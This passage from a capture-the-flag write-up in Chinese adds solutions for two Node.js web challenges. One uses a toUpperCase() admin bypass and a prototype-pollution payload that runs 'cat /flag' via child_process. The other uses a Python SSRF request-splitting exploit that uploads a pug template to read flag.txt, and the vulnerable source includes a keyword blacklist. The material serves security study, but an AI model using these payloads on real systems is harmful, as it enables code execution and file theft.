@@ -366,3 +366,242 @@ payload="""";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:
 ```
 利用尾部逃逸搞一个这样的``Info`` ``"union"*len(payload)+payload``
 然后拿到密码md5,这里可以反查出来，当然既然可以任意sql的话还可以直接注,
+
+## Ez_Express
+
+``www.zip``源码泄露
+
+发现是js写的
+
+涉及到JS``toUpperCase()``的安全性问题
+
+利用``ı``->``I`` 绕过注册 admin
+
+```js
+function safeKeyword(keyword) {
+  if(keyword.match(/(admin)/is)) {
+      return keyword
+  }
+
+  return undefined
+}
+req.session.user={
+    'user':req.body.userid.toUpperCase(),
+    'passwd': req.body.pwd,
+    'isLogin':false
+}
+```
+
+然后可以post到action这里又涉及到js原型链污染
+
+利用``merge``,``clone``
+污染这里的``outputFunctionName``
+```js
+router.get('/', function (req, res) {
+    if (!req.session.user) {
+        res.redirect('/login');
+    }
+    res.outputFunctionName = undefined;
+    res.render('index', data = {'user': req.session.user.user});
+});
+```
+Content-Type转成 application/json
+payload:
+```js
+{"lua":"a","__proto__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//"},"Submit":""}
+```
+### 参考资料
+
+javascript-up-low-ercase-tip:
+http://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html
+
+从杭电hgame-week4学原型链污染:
+https://www.jianshu.com/p/6e623e9debe3
+
+深入理解 JavaScript Prototype 污染攻击
+https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html
+
+## Node Game
+
+给了源码
+
+```js
+var express = require('express');
+var app = express();
+var fs = require('fs');
+var path = require('path');
+var http = require('http');
+var pug = require('pug');
+var morgan = require('morgan');
+const multer = require('multer');
+
+
+app.use(multer({dest: './dist'}).array('file'));
+app.use(morgan('short'));
+app.use("/uploads",express.static(path.join(__dirname, '/uploads')))
+app.use("/template",express.static(path.join(__dirname, '/template')))
+
+
+app.get('/', function(req, res) {
+    var action = req.query.action?req.query.action:"index";
+    if( action.includes("/") || action.includes("\\") ){
+        res.send("Errrrr, You have been Blocked");
+    }
+    file = path.join(__dirname + '/template/'+ action +'.pug');
+    var html = pug.renderFile(file);
+    res.send(html);
+});
+
+app.post('/file_upload', function(req, res){
+    var ip = req.connection.remoteAddress;
+    var obj = {
+        msg: '',
+    }
+    if (!ip.includes('127.0.0.1')) {
+        obj.msg="only admin's ip can use it"
+        res.send(JSON.stringify(obj));
+        return 
+    }
+    fs.readFile(req.files[0].path, function(err, data){
+        if(err){
+            obj.msg = 'upload failed';
+            res.send(JSON.stringify(obj));
+        }else{
+            var file_path = '/uploads/' + req.files[0].mimetype +"/";
+            var file_name = req.files[0].originalname
+            var dir_file = __dirname + file_path + file_name
+            if(!fs.existsSync(__dirname + file_path)){
+                try {
+                    fs.mkdirSync(__dirname + file_path)
+                } catch (error) {
+                    obj.msg = "file type error";
+                    res.send(JSON.stringify(obj));
+                    return
+                }
+            }
+            try {
+                fs.writeFileSync(dir_file,data)
+                obj = {
+                    msg: 'upload success',
+                    filename: file_path + file_name
+                } 
+            } catch (error) {
+                obj.msg = 'upload failed';
+            }
+            res.send(JSON.stringify(obj));    
+        }
+    })
+})
+
+app.get('/source', function(req, res) {
+    res.sendFile(path.join(__dirname + '/template/source.txt'));
+});
+
+
+app.get('/core', function(req, res) {//这里可以进行SSRF
+    var q = req.query.q;
+    var resp = "";
+    if (q) {
+        var url = 'http://localhost:8081/source?' + q
+        console.log(url)
+        var trigger = blacklist(url);
+        if (trigger === true) {
+            res.send("<p>error occurs!</p>");
+        } else {
+            try {
+                http.get(url, function(resp) {
+                    resp.setEncoding('utf8');
+                    resp.on('error', function(err) {
+                    if (err.code === "ECONNRESET") {
+                     console.log("Timeout occurs");
+                     return;
+                    }
+                   });
+
+                    resp.on('data', function(chunk) {
+                        try {
+                         resps = chunk.toString();
+                         res.send(resps);
+                        }catch (e) {
+                           res.send(e.message);
+                        }
+ 
+                    }).on('error', (e) => {
+                         res.send(e.message);});
+                });
+            } catch (error) {
+                console.log(error);
+            }
+        }
+    } else {
+        res.send("search param 'q' missing!");
+    }
+})
+
+function blacklist(url) {
+    var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
+    var arrayLen = evilwords.length;
+    for (var i = 0; i < arrayLen; i++) {
+        const trigger = url.includes(evilwords[i]);
+        if (trigger === true) {
+            return true
+        }
+    }
+}
+
+var server = app.listen(8081, function() {
+    var host = server.address().address
+    var port = server.address().port
+    console.log("Example app listening at http://%s:%s", host, port)
+})
+
+```
+
+这里考察Node 8.12.0 以下的 SSRF
+
+思想和CRLF类似
+
+可以参考 https://xz.aliyun.com/t/2894#toc-2
+
+利用nodejs低位拆分的处理
+
+Exp:
+```python
+import urllib.parse
+import requests
+
+payload = ''' HTTP/1.1
+Host: x
+Connection: keep-alive
+
+POST /file_upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810
+Connection: keep-alive
+cache-control: no-cache
+Host: x
+Content-Length: 290
+
+----------------------------919695033422425209299810
+Content-Disposition: form-data; name="file"; filename="eki.pug"
+Content-Type: /../template
+
+doctype html
+html
+  head
+    style
+      include ../../../../../../../flag.txt
+
+----------------------------919695033422425209299810--
+
+GET /flag HTTP/1.1
+Host: x
+Connection: close
+x:'''
+payload = payload.replace("\n", "\r\n")
+payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
+print(payload)
+r = requests.get('http://4dc2eead-14ed-41d0-8846-474af06a6886.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))
+print(r.text)
+```
+
+执行后pug文件就上传到template文件夹里并且读取了flag.txt
